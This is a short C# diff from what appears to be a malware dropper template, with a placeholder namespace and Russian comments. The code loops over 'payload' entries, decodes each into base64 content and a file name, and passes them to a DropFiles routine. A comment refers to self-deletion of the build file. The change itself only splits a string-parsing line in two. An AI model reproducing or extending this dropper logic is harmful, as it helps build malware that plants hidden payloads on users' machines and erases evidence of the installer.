@@ -42,7 +42,8 @@ namespace %SpaceName%
             foreach (string payload in files)
             {
                 // Разбиваем строки на подстроки 
-                string b64 = payload.Split('™')[0], plName = payload.Split('™')[1];
+                string b64 = payload.Split(Convert.ToChar("™"))[0];                
+                string plName = payload.Split(Convert.ToChar("™"))[1];
                 DropFiles(b64, plName);
             }
             // Проверяем на запуск самоудаления билд файла
